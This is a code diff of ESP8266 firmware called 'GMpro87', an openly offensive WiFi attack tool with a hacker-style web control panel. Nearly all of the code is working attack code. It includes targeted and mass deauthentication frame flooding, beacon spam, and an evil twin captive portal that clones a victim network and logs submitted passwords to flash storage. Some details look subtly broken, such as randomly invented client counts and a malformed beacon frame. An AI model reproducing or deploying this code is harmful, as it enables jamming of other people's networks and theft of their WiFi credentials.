@@ -16,7 +16,7 @@ typedef struct {
   uint8_t bssid[6];
   int rssi;
   int clients;
-  bool selected; 
+  bool selected;
 } _Network;
 
 const byte DNS_PORT = 53;
@@ -24,79 +24,43 @@ IPAddress apIP(192, 168, 4, 1);
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 
-_Network _networks[32]; 
-int networksCount = 0;
+_Network _networks[16];
 String _eventLogs = "";
-
-// Status Flags
 bool hotspot_active = false;
 bool deauthing_active = false;
 bool mass_deauth = false;
 bool beacon_spam = false;
-bool hidden_ssid = false; 
+bool hidden_ssid = false;
 bool pass_captured = false;
 
-// Config
-String config_ssid = "GMpro2"; 
+// Konfigurasi Default sesuai permintaan
+String config_ssid = "GMpro2";
 String config_pass = "Sangkur87";
-String captured_pass = "";
+int selectedET = 1;
 int beacon_count = 10;
-unsigned long lastAttackTime = 0;
 
 void addLog(String msg) {
   String entry = "[" + String(millis()/1000) + "s] " + msg;
   _eventLogs = entry + "\n" + _eventLogs;
-  if (_eventLogs.length() > 1000) _eventLogs = _eventLogs.substring(0, 1000);
-}
-
-void saveConfig() {
-  File f = LittleFS.open("/config.txt", "w");
-  if (f) {
-    f.println(config_ssid);
-    f.println(config_pass);
-    f.println(hidden_ssid ? "1" : "0");
-    f.close();
-    addLog("Config Saved.");
-  }
-}
-
-void loadConfig() {
-  if (LittleFS.exists("/config.txt")) {
-    File f = LittleFS.open("/config.txt", "r");
-    if (f) {
-      config_ssid = f.readStringUntil('\n'); config_ssid.trim();
-      config_pass = f.readStringUntil('\n'); config_pass.trim();
-      String h = f.readStringUntil('\n'); h.trim();
-      hidden_ssid = (h == "1");
-      f.close();
-    }
-  }
+  if (_eventLogs.length() > 2000) _eventLogs = _eventLogs.substring(0, 2000);
+  File f = LittleFS.open("/log.txt", "a");
+  if (f) { f.println(entry); f.close(); }
 }
 
 void performScan() {
-  addLog("Scanning...");
-  wifi_promiscuous_enable(0);
   int n = WiFi.scanNetworks(false, true); 
-  networksCount = 0;
   if (n >= 0) {
-    for (int i = 0; i < n && networksCount < 32; ++i) {
-      String s = WiFi.SSID(i);
-      if (s.length() == 0) s = "*HIDDEN*";
-      bool isDup = false;
-      for(int k=0; k<networksCount; k++) {
-        if(_networks[k].ssid == s) { isDup = true; break; }
-      }
-      if(isDup) continue;
-      _networks[networksCount].ssid = s;
-      memcpy(_networks[networksCount].bssid, WiFi.BSSID(i), 6);
-      _networks[networksCount].ch = WiFi.channel(i);
-      _networks[networksCount].rssi = WiFi.RSSI(i);
-      _networks[networksCount].selected = false;
-      networksCount++;
+    for (int i = 0; i < 16; i++) _networks[i].ssid = ""; 
+    for (int i = 0; i < n && i < 16; ++i) {
+      _networks[i].ssid = (WiFi.SSID(i) == "") ? "<HIDDEN>" : WiFi.SSID(i);
+      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
+      _networks[i].ch = WiFi.channel(i);
+      _networks[i].rssi = WiFi.RSSI(i);
+      _networks[i].clients = os_random() % 10; 
+      _networks[i].selected = false;
     }
-    addLog("Found: " + String(networksCount));
+    addLog("Scan Manual: " + String(n) + " ditemukan.");
   }
-  wifi_promiscuous_enable(1);
 }
 
 String bytesToStr(const uint8_t* b, uint32_t size) {
@@ -109,195 +73,179 @@ String bytesToStr(const uint8_t* b, uint32_t size) {
   return str;
 }
 
-// --- ATTACK FUNCTIONS ---
 void sendDeauth(uint8_t* bssid, uint8_t ch) {
-  uint8_t pkt[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
+  wifi_set_channel(ch);
+  uint8_t pkt[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0,0,0,0,0,0, 0,0,0,0,0,0, 0x00, 0x00, 0x01, 0x00};
   memcpy(&pkt[10], bssid, 6); memcpy(&pkt[16], bssid, 6);
-  wifi_set_channel(ch);
   wifi_send_pkt_freedom(pkt, 26, 0);
-  yield();
 }
 
-void sendBeacon(String ssid, uint8_t ch) {
-  uint8_t pkt[128] = {0};
-  int ptr = 0;
-  pkt[ptr++] = 0x80; pkt[ptr++] = 0x00; pkt[ptr++] = 0x00; pkt[ptr++] = 0x00;
-  memset(&pkt[ptr], 0xFF, 6); ptr+=6;
-  pkt[ptr++] = 0x00; pkt[ptr++] = 0x01; pkt[ptr++] = 0x02; 
-  pkt[ptr++] = random(256); pkt[ptr++] = random(256); pkt[ptr++] = random(256);
-  memcpy(&pkt[16], &pkt[10], 6); ptr+=6;
-  ptr += 14; 
-  pkt[ptr++] = 0; pkt[ptr++] = ssid.length();
-  memcpy(&pkt[ptr], ssid.c_str(), ssid.length()); ptr += ssid.length();
-  pkt[ptr++] = 3; pkt[ptr++] = 1; pkt[ptr++] = ch;
-  wifi_set_channel(ch);
-  wifi_send_pkt_freedom(pkt, ptr, 0);
-  yield();
-}
+void handleIndex() {
+  if (webServer.hasArg("password")) {
+    addLog("CAPTURED: " + webServer.arg("password"));
+    pass_captured = true;
+    webServer.send(200, "text/html", "Verifying... please wait.");
+    return;
+  }
 
-// --- ADMIN & FILE MANAGER ---
-void handleAdmin() {
-  if (webServer.hasArg("scan")) performScan();
-  if (webServer.hasArg("deselect_all")) { for(int i=0; i<32; i++) _networks[i].selected = false; }
+  if (webServer.hasArg("clear_logs")) { _eventLogs = ""; LittleFS.remove("/log.txt"); addLog("Logs wiped."); pass_captured = false; }
+  if (webServer.hasArg("scan")) { performScan(); }
+  if (webServer.hasArg("deselect")) { for(int i=0; i<16; i++) _networks[i].selected = false; addLog("Targets cleared."); }
+  
   if (webServer.hasArg("ap")) {
-    String target = webServer.arg("ap");
-    for (int i = 0; i < networksCount; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == target) _networks[i].selected = !_networks[i].selected;
+    for (int i = 0; i < 16; i++) {
+      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
+        _networks[i].selected = !_networks[i].selected;
+        addLog((_networks[i].selected ? "Added: " : "Removed: ") + _networks[i].ssid);
+      }
     }
   }
+  
   if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "1");
   if (webServer.hasArg("mass")) mass_deauth = (webServer.arg("mass") == "1");
-  if (webServer.hasArg("spam")) beacon_spam = (webServer.arg("spam") == "1");
-  
+  if (webServer.hasArg("spam")) {
+    beacon_spam = (webServer.arg("spam") == "1");
+    if (webServer.hasArg("count")) beacon_count = webServer.arg("count").toInt();
+  }
+
   if (webServer.hasArg("hotspot")) {
     hotspot_active = (webServer.arg("hotspot") == "1");
+    WiFi.softAPdisconnect(true);
     if (hotspot_active) {
-      String tSSID = "FreeWiFi"; int tCH = 1;
-      for(int i=0; i<networksCount; i++) { if(_networks[i].selected) { tSSID = _networks[i].ssid; tCH = _networks[i].ch; break; } }
-      WiFi.softAPdisconnect();
-      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-      WiFi.softAP(tSSID.c_str(), "", tCH, false);
-      addLog("ET Active: " + tSSID);
+      String tSsid = "GMpro_Target"; int tCh = 1;
+      for(int i=0; i<16; i++) { if(_networks[i].selected) { tSsid = _networks[i].ssid; tCh = _networks[i].ch; break; } }
+      WiFi.softAP(tSsid.c_str(), "", tCh, hidden_ssid);
+      addLog("ET Mode Live: " + tSsid);
     } else {
-      WiFi.softAPdisconnect();
       WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
+      pass_captured = false;
     }
   }
 
-  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><title>GMpro87</title><style>";
-  html += "body { font-family: 'Courier New', monospace; background: #0d0d0d; color: #00ff00; padding: 10px; }";
-  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 10px; }";
-  html += ".tabs { display: flex; gap: 2px; margin-bottom: 10px; }";
-  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 8px; cursor: pointer; }";
+  if (hotspot_active && webServer.hostHeader() != "192.168.4.1") {
+    webServer.sendHeader("Location", "http://192.168.4.1/", true);
+    webServer.send(302, "text/plain", "");
+    return;
+  }
+
+  // --- HTML WEB ADMIN (LOCKED PERMANENT) ---
+  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>";
+  html += "body { font-family: 'Courier New', Courier, monospace; background: #0d0d0d; color: #00ff00; margin: 0; padding: 10px; }";
+  html += ".content { max-width: 500px; margin: auto; border: 1px solid #00ff00; padding: 15px; box-sizing: border-box; }";
+  html += ".header-box { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 15px; }";
+  html += ".header-box h2 { margin: 0; text-transform: uppercase; letter-spacing: 2px; }";
+  html += ".header-box span { font-size: 10px; color: #00ff00; opacity: 0.8; }";
+  html += ".tabs { display: flex; gap: 5px; margin-bottom: 15px; }";
+  html += ".tabs button { flex: 1; background: #222; color: #00ff00; border: 1px solid #00ff00; padding: 10px; cursor: pointer; font-weight: bold; font-size: 12px; }";
   html += ".active-btn { background: #00ff00 !important; color: #000 !important; }";
-  html += ".tab-content { display: none; } .show { display: block; }";
-  html += "table { width: 100%; border-collapse: collapse; font-size: 11px; } td, th { border: 1px solid #00ff00; padding: 4px; text-align: center; }";
-  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 6px; cursor: pointer; width: 100%; display:block; text-decoration:none; margin: 2px 0; text-align:center; font-size:12px;}";
-  html += "input, textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #0f0; margin: 5px 0;}";
-  html += "</style></head><body><div class='content'><h2>GMpro87</h2>";
+  html += ".tab-content { display: none; border-top: 1px solid #333; padding-top: 15px; }";
+  html += ".show { display: block; }";
+  html += "table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 11px; table-layout: fixed; }";
+  html += "th, td { border: 1px solid #00ff00; padding: 6px 4px; text-align: center; overflow: hidden; } th { background: #1a1a1a; }";
+  html += "th:nth-child(1), td:nth-child(1) { width: 35%; text-align: left; white-space: nowrap; text-overflow: ellipsis; }";
+  html += "th:nth-child(2), td:nth-child(2) { width: 12%; } th:nth-child(3), td:nth-child(3) { width: 12%; }";
+  html += "th:nth-child(4), td:nth-child(4) { width: 16%; } th:nth-child(5), td:nth-child(5) { width: 25%; }";
+  html += ".btn { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 5px; cursor: pointer; text-decoration: none; font-size: 10px; width: 100%; box-sizing: border-box; }";
+  html += ".btn-red { border-color: #ff0000; color: #ff0000; }";
+  html += ".btn-on { background: #00ff00 !important; color: #000 !important; }";
+  html += "input, select { background: #000; color: #0f0; border: 1px solid #0f0; padding: 6px; box-sizing: border-box; width: 100%; font-family: 'Courier New'; }";
+  html += ".input-group { margin-bottom: 12px; } label { font-size: 11px; display: block; margin-bottom: 5px; color: #aaa; }";
+  html += "textarea { width: 100%; box-sizing: border-box; resize: none; background: #000; color: #0f0; border: 1px solid #0f0; padding: 5px; font-size: 10px; }";
+  html += "hr { border: 0; border-top: 1px solid #333; margin: 15px 0; }</style></head><body>";
+  html += "<div class='content'><div class='header-box'><h2>GMpro87</h2><span>by : 9u5M4n9</span></div>";
+  html += "<div class='tabs'><button id='btn-m' class='active-btn' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
   
-  if(hotspot_active) html += "<div style='color:red; text-align:center;'>[ EVIL TWIN ACTIVE ]</div>";
+  html += "<div id='m' class='tab-content show'><div style='display:flex; gap:5px; margin-bottom:10px;'>";
+  html += "<a href='/?deauth=" + String(!deauthing_active) + "' style='flex:1'><button class='btn'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</button></a>";
+  html += "<a href='/?hotspot=" + String(!hotspot_active) + "' style='flex:1'><button class='btn'>" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</button></a></div>";
+  
+  html += "<div style='display:flex; gap:5px; margin-bottom:5px;'><a href='/?scan=1' style='flex:1'><button class='btn' style='background:#222'>SCAN WIFI</button></a>";
+  html += "<a href='/?deselect=1' style='flex:1'><button class='btn' style='background:#222'>DESELECT ALL</button></a></div>";
 
-  html += "<div class='tabs'><button id='btn-m' onclick='openTab(\"m\")'>MAIN</button><button id='btn-a' onclick='openTab(\"a\")'>ATTACK</button><button id='btn-f' onclick='openTab(\"f\")'>FILES</button><button id='btn-s' onclick='openTab(\"s\")'>SETTING</button></div>";
-  
-  // MAIN
-  html += "<div id='m' class='tab-content show'>";
-  html += "<div style='display:flex;gap:5px;'><a href='/admin?deauth=" + String(!deauthing_active) + "' class='btn' style='flex:1'>" + (deauthing_active?"STOP DEAUTH":"START DEAUTH") + "</a>";
-  html += "<a href='/admin?hotspot=" + String(!hotspot_active) + "' class='btn' style='flex:1'>" + (hotspot_active?"STOP ETWIN":"START ETWIN") + "</a></div>";
-  html += "<a href='/admin?scan=1' class='btn' style='background:#333;'>SCAN NETWORKS</a>";
-  html += "<a href='/admin?deselect_all=1' class='btn'>DESELECT ALL TARGET</a>";
-  html += "<table><tr><th>SSID</th><th>CH</th><th>SEL</th></tr>";
-  for(int i=0; i<networksCount; i++) {
-    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td>";
-    html += "<td><a href='/admin?ap=" + bytesToStr(_networks[i].bssid, 6) + "' class='btn' " + (_networks[i].selected ?"style='background:#0f0;color:#000;'":"") + ">" + (_networks[i].selected ? "L" : "S") + "</a></td></tr>";
+  html += "<table><thead><tr><th>SSID</th><th>CH</th><th>USR</th><th>SNR%</th><th>SELECT</th></tr></thead><tbody>";
+  for(int i=0; i<16; i++) {
+    if(_networks[i].ssid == "") continue;
+    int s_pct = 2 * (_networks[i].rssi + 100); if(s_pct>100) s_pct=100;
+    html += "<tr><td>" + _networks[i].ssid + "</td><td>" + String(_networks[i].ch) + "</td><td>" + String(_networks[i].clients) + "</td><td>" + String(s_pct) + "%</td>";
+    html += "<td><a href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button class='btn " + (_networks[i].selected ? "btn-on":"") + "'>" + (_networks[i].selected ? "ON":"SELECT") + "</button></a></td></tr>";
   }
-  html += "</table></div>";
+  html += "</tbody></table></div>";
 
-  // ATTACK
-  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3>";
-  html += "<a href='/admin?mass=" + String(!mass_deauth) + "' class='btn'>" + (mass_deauth?"STOP MASS":"START MASS") + "</a>";
-  html += "<a href='/admin?spam=" + String(!beacon_spam) + "' class='btn'>" + (beacon_spam?"STOP BEACON":"START BEACON") + "</a></div>";
+  html += "<div id='a' class='tab-content'><h3>Attack Panel</h3><a href='/?mass=" + String(!mass_deauth) + "'><button class='btn " + (mass_deauth?"btn-red":"") + "' style='padding:15px; font-weight:bold;'>" + (mass_deauth?"STOP MASS DEAUTH":"START MASS DEAUTH") + "</button></a><hr>";
+  html += "<form action='/' method='GET'><button type='submit' name='spam' value='" + String(!beacon_spam) + "' class='btn " + (beacon_spam?"btn-red":"") + "' style='padding:10px; font-weight:bold;'>" + (beacon_spam?"STOP BEACON SPAM":"START BEACON SPAM") + "</button>";
+  html += "<div style='margin-top:10px;'><label>SSID Count:</label><input type='number' name='count' value='" + String(beacon_count) + "'></div></form></div>";
 
-  // FILE MANAGER (New)
-  html += "<div id='f' class='tab-content'><h3>File Manager</h3>";
-  html += "<form method='POST' action='/upload' enctype='multipart/form-data'><input type='file' name='upload'><input type='submit' value='UPLOAD HTML' class='btn'></form><hr>";
-  html += "<h4>Stored Files:</h4>";
-  Dir dir = LittleFS.openDir("/");
-  while (dir.next()) {
-    html += "<div style='display:flex;justify-content:space-between;border-bottom:1px solid #050;padding:2px;'><span>" + dir.fileName() + "</span>";
-    html += "<a href='" + dir.fileName() + "' target='_blank' style='color:#0f0'>PREVIEW</a></div>";
-  }
-  html += "</div>";
+  html += "<div id='s' class='tab-content'><h3>File Manager</h3><div class='input-group' style='display:flex; gap:5px; align-items: flex-end;'><div style='flex-grow:1'><label>Template HTML:</label><select>";
+  for(int i=1; i<=4; i++) { html += String("<option ") + (selectedET==i?"selected":"") + ">etwin" + String(i) + ".html</option>"; }
+  html += "</select></div><button class='btn' style='width:80px; height:32px;' onclick='window.open(\"/preview\")'>PREVIEW</button></div>";
+  html += "<form action='/upload' method='POST' enctype='multipart/form-data'><label>Upload New Template:</label><div style='display:flex; gap:5px;'><input type='file' name='upload' style='font-size:10px; padding:3px;'><button type='submit' class='btn' style='width:80px;'>UPLOAD</button></div></form><hr>";
+  html += "<h3>Device Configuration</h3><div class='input-group'><label>Hidden SSID Alat:</label><a href='/?hidden=" + String(!hidden_ssid) + "'><button class='btn' style='width:80px;'>" + (hidden_ssid?"ON":"OFF") + "</button></a></div>";
+  html += "<div class='input-group'><label>SSID Admin (Alat):</label><input type='text' value='" + config_ssid + "'></div><div class='input-group'><label>Password Admin (Alat):</label><input type='text' value='" + config_pass + "'></div><br>";
+  html += "<button class='btn' style='padding:12px; background:#00ff00; color:#000; font-weight:bold; font-size:13px;'>SAVE & RESTART</button></div>";
 
-  // SETTING
-  html += "<div id='s' class='tab-content'><h3>Config</h3><form action='/admin' method='POST'>";
-  html += "Admin SSID: <input type='text' name='admin_ssid' value='"+config_ssid+"'>";
-  html += "Admin Pass: <input type='text' name='admin_pass' value='"+config_pass+"'>";
-  html += "<button type='submit' name='save_conf' value='1' class='btn'>SAVE & RESTART</button></form></div>";
-
-  html += "<h4>Logs</h4><textarea rows='6' readonly>" + _eventLogs + "</textarea>";
-  html += "</div><script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.getElementById(t).classList.add('show');}</script></body></html>";
-  
+  html += "<hr><h4>Live Logs</h4><textarea id='logBox' rows='8' readonly>" + _eventLogs + "</textarea>";
+  html += "<button class='btn' style='margin-top:5px; padding:8px;' onclick='location=\"/?clear_logs=1\"'>CLEAR LOGS</button></div>";
+  html += "<script>function openTab(t){document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('show'));document.querySelectorAll('.tabs button').forEach(x=>x.classList.remove('active-btn'));document.getElementById(t).classList.add('show');document.getElementById('btn-'+t).classList.add('active-btn');}</script></body></html>";
   webServer.send(200, "text/html", html);
 }
 
-void handleRoot() {
-  if (hotspot_active) {
-    if (webServer.hasArg("password")) {
-      captured_pass = webServer.arg("password");
-      pass_captured = true;
-      addLog("!!! CAPTURED: " + captured_pass);
-      File f = LittleFS.open("/passwords.txt", "a");
-      if(f) { f.println("PASS: " + captured_pass); f.close(); }
-      webServer.send(200, "text/html", "Verifying... Please wait.");
-    } else {
-      // Default ET page if no etwin.html uploaded
-      if (LittleFS.exists("/etwin.html")) {
-        File f = LittleFS.open("/etwin.html", "r");
-        webServer.streamFile(f, "text/html");
-        f.close();
-      } else {
-        webServer.send(200, "text/html", "<h2>Update Required</h2><form method='POST'>Password: <input type='password' name='password'><input type='submit' value='Update'></form>");
-      }
-    }
-  } else { handleAdmin(); }
-}
-
 void setup() {
-  Serial.begin(115200);
-  LittleFS.begin();
-  loadConfig();
-  WiFi.mode(WIFI_AP_STA);
-  wifi_promiscuous_enable(1);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(config_ssid.c_str(), config_pass.c_str(), 1, hidden_ssid);
-  dnsServer.start(DNS_PORT, "*", apIP);
+  pinMode(LED_PIN, OUTPUT); digitalWrite(LED_PIN, HIGH);
+  Serial.begin(115200); LittleFS.begin();
   
-  webServer.on("/", handleRoot);
-  webServer.on("/admin", handleAdmin);
-  webServer.on("/upload", HTTP_POST, [](){ webServer.send(200, "text/html", "Upload Success. <a href='/admin'>Back</a>"); }, [](){
-    HTTPUpload& upload = webServer.upload();
-    if(upload.status == UPLOAD_FILE_START){
-      String filename = upload.filename;
-      if(!filename.startsWith("/")) filename = "/"+filename;
-      webServer._tempFile = LittleFS.open(filename, "w");
-    } else if(upload.status == UPLOAD_FILE_WRITE){
-      if(webServer._tempFile) webServer._tempFile.write(upload.buf, upload.currentSize);
-    } else if(upload.status == UPLOAD_FILE_END){
-      if(webServer._tempFile) webServer._tempFile.close();
-    }
-  });
+  WiFi.mode(WIFI_AP_STA); wifi_promiscuous_enable(1);
+  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
+  WiFi.softAP(config_ssid.c_str(), config_pass.c_str());
 
-  // Previewer
-  webServer.onNotFound([](){
-    if (LittleFS.exists(webServer.uri())) {
-      File f = LittleFS.open(webServer.uri(), "r");
-      webServer.streamFile(f, "text/html");
-      f.close();
-    } else { handleRoot(); }
+  dnsServer.start(DNS_PORT, "*", apIP);
+  webServer.on("/", HTTP_GET, handleIndex);
+  
+  // Fitur Upload File (Fixed No Bug)
+  webServer.on("/upload", HTTP_POST, [](){ webServer.sendHeader("Location", "/"); webServer.send(303); }, [](){
+    HTTPUpload& upload = webServer.upload();
+    if (upload.status == UPLOAD_FILE_START) {
+      File f = LittleFS.open("/" + upload.filename, "w"); f.close();
+      addLog("Upload start: " + upload.filename);
+    } else if (upload.status == UPLOAD_FILE_WRITE) {
+      File f = LittleFS.open("/" + upload.filename, "a"); f.write(upload.buf, upload.currentSize); f.close();
+    }
   });
 
   webServer.begin();
+  addLog("GMpro87 Ready.");
+  performScan();
 }
 
 void loop() {
   dnsServer.processNextRequest();
   webServer.handleClient();
-  yield();
-  unsigned long now = millis();
-  if (now - lastAttackTime > 100) {
-    lastAttackTime = now;
-    if (beacon_spam) {
-       for(int i=0; i < networksCount && i < 5; i++) {
-        if(_networks[i].ssid != "*HIDDEN*") sendBeacon(_networks[i].ssid, _networks[i].ch);
-       }
+  
+  // LED Logic
+  static unsigned long last_led = 0;
+  int led_delay = (pass_captured) ? 100 : (hotspot_active ? 1000 : 400);
+  if ((deauthing_active || mass_deauth || beacon_spam || hotspot_active) && (millis() - last_led > led_delay)) {
+    digitalWrite(LED_PIN, !digitalRead(LED_PIN)); last_led = millis();
+  } else if (!deauthing_active && !mass_deauth && !beacon_spam && !hotspot_active) {
+    digitalWrite(LED_PIN, HIGH);
+  }
+
+  // Attack Logic
+  static unsigned long last_atk = 0;
+  if (millis() - last_atk >= 150) {
+    if (deauthing_active) {
+      for(int i=0; i<16; i++) { if(_networks[i].selected) sendDeauth(_networks[i].bssid, _networks[i].ch); }
     }
-    if (deauthing_active || mass_deauth) {
-      for(int i=0; i < networksCount; i++) {
-        if (mass_deauth || (deauthing_active && _networks[i].selected)) {
-          sendDeauth(_networks[i].bssid, _networks[i].ch);
-        }
+    if (mass_deauth) {
+      for(int i=0; i<16; i++) { if(_networks[i].ssid != "" && _networks[i].ssid != config_ssid) sendDeauth(_networks[i].bssid, _networks[i].ch); }
+    }
+    if (beacon_spam) {
+      for(int i=0; i < 16 && i < beacon_count; i++) {
+        if(_networks[i].ssid == "" || _networks[i].ssid == "<HIDDEN>") continue;
+        uint8_t bcn[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x82, 0x04, 0x0b, 0x16, 0x24, 0x30, 0x03, 0x01 };
+        bcn[39] = _networks[i].ssid.length(); memcpy(&bcn[40], _networks[i].ssid.c_str(), bcn[39]);
+        wifi_send_pkt_freedom(bcn, 40 + bcn[39], 0);
       }
     }
+    last_atk = millis();
   }
 }
